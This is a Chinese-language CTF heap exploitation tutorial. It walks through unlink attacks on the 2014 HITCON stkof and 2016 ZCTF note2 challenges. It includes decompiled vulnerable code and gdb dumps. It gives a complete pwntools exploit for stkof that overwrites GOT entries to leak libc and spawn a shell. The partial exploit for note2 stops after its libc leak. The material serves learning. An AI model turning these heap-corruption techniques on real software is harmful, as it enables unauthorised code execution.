# pwn堆入门系列教程4
[pwn堆入门系列教程1](https://xz.aliyun.com/t/6087)  
[pwn堆入门系列教程2](https://xz.aliyun.com/t/6169)  
[pwn堆入门系列教程3](https://xz.aliyun.com/t/6252)
序言：这次进入到unlink的学习了，unlink在第一节已经用上了，但我用起来还不是很流畅，还是去翻了第一节的笔记，最主要是指针的问题，可能没学好指针，理解了unlink后就简单做了
## 2014 HITCON stkof
### 功能分析
  1. 几乎无输出的题目
  2. 申请功能，申请指定大小size
  3. 删除功能，删除idx位置处的chunk
  4. 输出一些无用字符串，有个strlen，本来想用来做/bin/sh的，发觉也不行
  5. 编辑功能
### 漏洞点分析
    signed __int64 fill()
    {
      signed __int64 result; // rax
      int i; // eax
      unsigned int idx; // [rsp+8h] [rbp-88h]
      __int64 size; // [rsp+10h] [rbp-80h]
      char *ptr; // [rsp+18h] [rbp-78h]
      char s; // [rsp+20h] [rbp-70h]
      unsigned __int64 v6; // [rsp+88h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      fgets(&s, 16, stdin);
      idx = atol(&s);
      if ( idx > 0x100000 )
        return 0xFFFFFFFFLL;
      if ( !globals[idx] )
        return 0xFFFFFFFFLL;
      fgets(&s, 16, stdin);
      size = atoll(&s);
      ptr = globals[idx];
      for ( i = fread(ptr, 1uLL, size, stdin); i > 0; i = fread(ptr, 1uLL, size, stdin) )
      {
        ptr += i;
        size -= i;
      }
      if ( size )
        result = 0xFFFFFFFFLL;
      else
        result = 0LL;
      return result;
    }
fill函数里也就是编辑功能处可以自定大小编辑，也就是说存在堆溢出
### 漏洞利用过程
这里有个小细节，自己补充下知识，关于缓冲区的问题，这个细节也解决了我自己出pwn题的时候输出，为什么输出不了的问题  
就是如果未设置缓冲区为0的话，这道题里是第一次调用fgets是要先申请1024大小的堆块作为缓冲区的，还有printf也要申请1024大小的堆块作为缓冲区
[知道创宇讲解的一道题目](https://paper.seebug.org/450/)  
[ctf-wiki讲解这部分知识](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/)
  1. 首先先申请一块内存，冲掉printf和fgets所需缓冲区
    free_got = elf.got['free']
        puts_got = elf.got['puts']
        puts_plt = elf.plt['puts']
        atoi_got = elf.got['atoi']
        ptr = 0x0000000000602140+0x10
        alloc(0x100) #idx1
  1. 是unlink部分，当然用unlink方法来解了，第一节学过了，伪造一个chunk，然后通过溢出覆盖第二个堆块的pre_size和size，在free第二个堆块的时候就会unlink我们的伪造的p堆块
    alloc(0x30) #idx2
        alloc(0x80) #idx3
        alloc(0x30) #idx4
        payload = p64(0) + p64(0x30) + p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(0x30, 'a')
        payload += p64(0x30)
        payload += p64(0x90)
        fill(2, payload)
        delete(3)
    gdb-peda$ x/20gx 0x20f7560-0x30
    0x20f7530:  0x0000000000000000  0x0000000000000041 #chunk2
    0x20f7540:  0x0000000000000000  0x0000000000000030 #p
    0x20f7550:  0x0000000000602138  0x0000000000602140
    0x20f7560:  0x6161616161616161  0x6161616161616161
    0x20f7570:  0x0000000000000030  0x0000000000000090 #chunk3
    0x20f7580:  0x0000000000000000  0x0000000000000000
    0x20f7590:  0x0000000000000000  0x0000000000000000
    0x20f75a0:  0x0000000000000000  0x0000000000000000
    0x20f75b0:  0x0000000000000000  0x0000000000000000
    0x20f75c0:  0x0000000000000000  0x0000000000000000
这里已经溢出覆盖掉chunk3的size了  
其实unlink已经说过一次了，
  * 首先，第一步要过掉unlink的size检测，覆盖chunk3的pre_size为fake_chunk大小
  * 其次chunk3的insue位要为0，标志前面一个堆块未在使用当中
  * 然后关键点就是伪造fd跟bk了
  * 在第一点中我将ptr设置为global+0x10意思就是第二块堆块地址，这就是存放p的地方 
  * unlink第一步 FD = p->fd = ptr-0x18
  * unlink第二步 BK=p->bk = ptr-0x10
  * unlink第三步 判断FD->bk == p && BK->fd == p ?
  * 过了检验后
  * FD->bk = * (ptr-0x18 + 0x18 )= BK = ptr -0x10
  * BK->fd = _(ptr-0x10+0x10) = FD = ptr-0x18  
最终结果就是_ptr = ptr-0x18，而ptr是0x0000000000602150故最终就是将global+0x10处的值改为0x602138  
然后我们在编辑第二块的时候实际上就是编辑0x602138处，也就是global-0x8处
  1. 泄露地址
    payload = 'a'*0x10
        payload += p64(free_got)+p64(puts_got) + 'a'*8 + p64(atoi_got) #这里对应的是第一块堆块，第二块，第三块和第四块
        fill(2, payload) 
        fill(1,p64(puts_plt))
        delete(2)
        io.recvuntil('FAIL\n')
        io.recvuntil('FAIL\n')
        puts_addr = u64(io.recvline().strip().ljust(8, '\x00'))
        io.success("puts_addr: 0x%x" % puts_addr)
        libc_base = puts_addr - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
        bin_sh_addr = libc_base + libc.search('/bin/sh').next()
        io.success("libc_base: 0x%x" % libc_base)
        io.success("system_addr: 0x%x" % system_addr)
没什么好说的啊，覆写got表为put泄露地址
  1. 最后我修改atoi为system，因为输入的会经过atoi转换，所以输入的就是system参数
    gdb.attach(io)
        fill(4, p64(system_addr))
        io.sendline("/bin/sh\x00")
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'stkof'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'stkof'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
        libc = ELF(libc)
    else:
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    def alloc(size):
        io.sendline("1")
        io.sendline(str(size))
        io.recvuntil("OK\n")
    def printf(idx):
        io.sendline("4")
        io.sendline(str(idx))
    def fill(idx, content):
        io.sendline("2")
        io.sendline(str(idx))
        io.sendline(str(len(content)))
        io.sendline(content)
        io.recvuntil("OK\n")
    def delete(idx):
        io.sendline("3")
        io.sendline(str(idx))
    def exp():
        free_got = elf.got['free']
        puts_got = elf.got['puts']
        puts_plt = elf.plt['puts']
        atoi_got = elf.got['atoi']
        ptr = 0x0000000000602140+0x10
        #for buffer
        alloc(0x100) #idx1   
        alloc(0x30) #idx2
        alloc(0x80) #idx3
        alloc(0x30) #idx4
        payload = p64(0) + p64(0x30) + p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(0x30, 'a')
        payload += p64(0x30)
        payload += p64(0x90)
        fill(2, payload)
        delete(3)
        payload = 'a'*0x10
        payload += p64(free_got)+p64(puts_got) + 'a'*8 + p64(atoi_got)
        fill(2, payload) 
        fill(1,p64(puts_plt))
        delete(2)
        io.recvuntil('FAIL\n')
        io.recvuntil('FAIL\n')
        puts_addr = u64(io.recvline().strip().ljust(8, '\x00'))
        io.success("puts_addr: 0x%x" % puts_addr)
        libc_base = puts_addr - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
        bin_sh_addr = libc_base + libc.search('/bin/sh').next()
        io.success("libc_base: 0x%x" % libc_base)
        io.success("system_addr: 0x%x" % system_addr)
        gdb.attach(io)
        fill(4, p64(system_addr))
        io.sendline("/bin/sh\x00")
        #gdb.attach(io)
    if __name__ == '__main__':
        exp()
        io.interactive()
## 2016 ZCTF note2
[ctf-wiki讲解](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/)
我只讲差异，里面有的我就不讲了，我只发现了这个漏洞点  
程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。  
然后我并不会利用这个，本来想利用chunk
extends上一节学的，发觉他free后的大小不怎么对，到时看下源码吧，他free后的chunk大小不是合并后的大小，最后看到了大佬讲解的那个0，然后通过-1转成无符号整数，这个我自己查看的时候看不出
### 漏洞利用过程
第一步构造unlink，原理上一节弄过了，所以感觉这次顺畅好多
    ptr = 0x0000000000602120 
        first()
        # unlink
        payload = p64(0) + p64(0xa0) + p64(ptr-0x18) + p64(ptr-0x10) 
        payload = payload.ljust(0x80, 'a')
        newnote(0x80, payload)
        newnote(0, 'b'*0x8)
        newnote(0x80, 'c'*0x20)
        delete(1)
        newnote(0, 'b'*0x10+p64(0xa0)+p64(0x90))
        delete(2)
unlink过后修改ptr[0]指针，指向atoi的got表，泄露地址，为什么指向atoi?为后面做准备
    payload = 'a'*0x18 + p64(elf.got['atoi'])
        editnote(0, 1, payload) 
        shownote(0)
        io.recvuntil("TheNewContents:Edit note success!\n")
        io.recvuntil("Content is ")
        atoi_addr = u64(io.recvline().strip().ljust(8, '\x00'))
        io.success("atoi_addr: 0x%x" % atoi_addr)
        libc_base = atoi_addr - libc.symbols['atoi']